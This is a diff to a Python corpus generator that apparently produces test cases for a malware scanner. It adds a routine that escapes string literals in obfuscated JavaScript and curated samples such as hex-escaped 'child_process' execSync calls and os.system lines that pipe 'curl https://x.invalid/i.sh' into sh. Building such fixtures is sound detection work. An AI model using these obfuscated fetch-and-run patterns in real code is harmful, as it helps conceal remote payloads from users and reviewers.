@@ -13,6 +13,7 @@ import base64
 import json
 import os
 import random
+import re
 
 from lazaret.scanner import core
 
@@ -1428,6 +1429,74 @@ STRARR_CURATED = [
     "fetch(_0x33e1(0x1d4),{'method':'POST','body':process[_0x33e1(0x1d3)]});",
 ]
 
+# (the detection round) literals written with \\x and \\u escapes
+# (unicodeEscapeSequence), and proxy objects under one name in several
+# functions: obfuscated files built here, then literals escaped at random
+_ESC_LIT_RE = re.compile(r"""(['"])((?:[^'"\\\n]|\\[^\n]){0,120})\1""")
+_ESC_TOKEN_RE = re.compile(r"\\u\{[0-9a-fA-F]+\}|\\u[0-9a-fA-F]{4}|\\x[0-9a-fA-F]{2}|\\[^\n]|.", re.S)
+
+
+def _esc_lit(m, rnd):
+    """A literal with some of its characters written as escapes (its own escapes kept), now and then a broken one."""
+    if rnd.random() < 0.4:
+        return m.group()
+    out = []
+    for t in _ESC_TOKEN_RE.findall(m.group(2)):
+        r, o = rnd.random(), ord(t[0])
+        if len(t) > 1 or r >= 0.72:
+            out.append(t)
+        elif r < 0.45 and o < 0x100:
+            out.append("\\x%02x" % o)
+        elif r < 0.7 and o < 0x10000:
+            out.append("\\u%04x" % o)
+        else:
+            out.append(rnd.choice(["\\x2", "\\u00", "\\n", "\\\\", "\\x27", "\\u{41}"]))
+    return m.group(1) + "".join(out) + m.group(1)
+
+
+def escaped_case(rnd):
+    """An obfuscated file (a string array's, or proxy objects under one name
+    in several functions, some uses before their object) with its literals
+    written in part with escapes."""
+    if rnd.random() < 0.5:
+        text = strarr_case(rnd)
+    else:
+        px = rnd.choice(["_0x5a", "a0_0x1f", "o"])
+        parts = []
+        for k in range(rnd.randint(1, 4)):
+            ents = {"kC": "function(f,a,b){return f(a,b);}",
+                    "kO": "function(a,b){return a" + rnd.choice(["===", "+", "<", " in ", "&&"]) + "b;}",
+                    "kS": "'" + rnd.choice(["child_proc", "exe", "https", "http://x.invalid/"]) + "'+'"
+                          + rnd.choice(["ess", "cSync", "", "c"]) + "'",
+                    "kN": "function(x){return x+1;}", "kP": px + "['kC']"}
+            obj = "{" + ",".join("'" + k + "':" + ents[k] for k in rnd.sample(sorted(ents), rnd.randint(1, 4))) + "}"
+            uses = ";".join(rnd.choice([px + "['kC'](require," + px + "['kS'],1)", px + "['kO'](a," + px + "['kS'])",
+                                        px + "['kS']", "y(" + px + "['kC'](g,1,2))", px + "['kO'](1,2)",
+                                        px + "['kP'](fetch,'http://x.invalid/c',{})", "require('child_process')"])
+                            for _ in range(rnd.randint(1, 4)))
+            parts.append("function f" + str(k) + "(){" + rnd.choice(["", uses + ";"]) + "const " + px + "=" + obj + ";"
+                         + uses + ";}")
+        text = rnd.choice(["\n", ""]).join(parts)
+    return _ESC_LIT_RE.sub(lambda m: _esc_lit(m, rnd), text)
+
+
+ESCAPED_CURATED = [
+    "require('\\x63\\x68\\x69\\x6c\\x64\\x5f\\x70\\x72\\x6f\\x63\\x65\\x73\\x73')['\\x65\\x78\\x65\\x63\\x53\\x79\\x6e\\x63']"
+    "('\\u0063\\u0075\\u0072\\u006c\\u0020\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0078\\u002e"
+    "\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u002f\\u0069\\u002e\\u0073\\u0068\\u0020\\u007c\\u0020\\u0073\\u0068');\n",
+    "const o={'\\x6f\\x45':function(f,a){return f(a);}};\no['\\x6f\\x45'](require,'\\x63\\x68\\x69\\x6c\\x64\\x5f\\x70\\x72\\x6f\\x63\\x65\\x73\\x73');\n",
+    "function f(){const _0x5a={'a':function(g,b){return g(b);},'s':'child_'+'process'};return _0x5a['a'](require,_0x5a['s']);}\n"
+    "function h(){const _0x5a={'a':function(b,c){return b+c;},'s':'execSync'};return f()[_0x5a['s']](_0x5a['a']('cu','rl'));}\n",
+    "o['a'](g,1);\nconst o={'a':function(f,a){return f(a);}};\nconst o={'a':function(x){return x+1;}};\no['a'](g,1);\n",
+    "x('\\x1b[31m', '\\x27', '\\x5c', \"\\x41\\x22\", '\\n\\x41', '\\u{41}', '\\x41\\u00e9', '\\\\x41', `\\x41`);\n"
+    "y(b'\\x41', r'\\x41', f'\\x41', u'\\x41', '\\x41');\n",
+    "import os\nos.system('\\x63\\x75\\x72\\x6c https://x.invalid/i.sh | sh')\n",
+    "import os\nos.system('" + "".join("\\x%02x" % ord(ch) for ch in "curl https://x.invalid/i.sh | sh") + "')\n",
+    "x('\\x41\\x42', '\\x41\\x42\\x43', 'ab\\x63\\x64\\x65', '\\x41\\x27\\x42', '\\u0041\\u0042\\u0043\\x44')\n",
+    "b'\\x12\"\\x41\\x42\"\\x43' + '\\\"\\x44\\x45' + \"'\\x46'\"\n",
+]
+
+
 # (0.1.8) programs written in string literals: the network call a literal's
 # text names is the literal's own code (core._dl_in_code), a template
 # literal's or an f-string's interpolation is the code around it
@@ -1491,7 +1560,7 @@ def corpus(seed=20260926, scale=1):
     rnd = random.Random(seed)
     cases = (list(CURATED) + SIGN_CURATED + PROSE_CURATED + SELF_CURATED + PERSIST_CURATED + PUBLISH_CURATED
              + DECODED_CURATED + SPAWN_CURATED + EXFIL_CURATED + SERVICE_CURATED + XOR_CURATED
-             + CHARCODE_CURATED + FLOW_CURATED + STRARR_CURATED + RECEIVED_CURATED + AGENT_CURATED)
+             + CHARCODE_CURATED + FLOW_CURATED + STRARR_CURATED + RECEIVED_CURATED + AGENT_CURATED + ESCAPED_CURATED)
     for pieces, count, most in ((MIXED, 2500, 14), (QUOTING, 1500, 16), (CD, 1500, 16), (NODE_E, 1500, 16),
                                 (SCRIPT, 1000, 12), (RECEIVED, 1500, 16), (SIGNS, 2000, 10), (PROSE, 2500, 16),
                                 (SELF, 1500, 14), (SELF_ASYNC, 2000, 12), (PERSIST, 2500, 10), (PUBLISH, 3000, 12), (DECODED, 4000, 12), (SPAWN, 3000, 10),
@@ -1507,6 +1576,8 @@ def corpus(seed=20260926, scale=1):
                            "pypy", "sh", "bash", "zsh", "perl", "env", "\u212ash", "\u017fh", "x"])
         after = rnd.choice(["", " ", "\t", "\n", "\r\n", "\x1c", "\xa0", "/"])
         cases.append("#!" + head + name + after + "".join(rnd.choice(SHEBANG) for _ in range(rnd.randint(0, 6))))
+    for _ in range(400 * scale):                    # escapes and proxy objects under one name (the detection round)
+        cases.append(escaped_case(rnd))
     return [json.loads(json.dumps(text)) for text in cases]
 
 
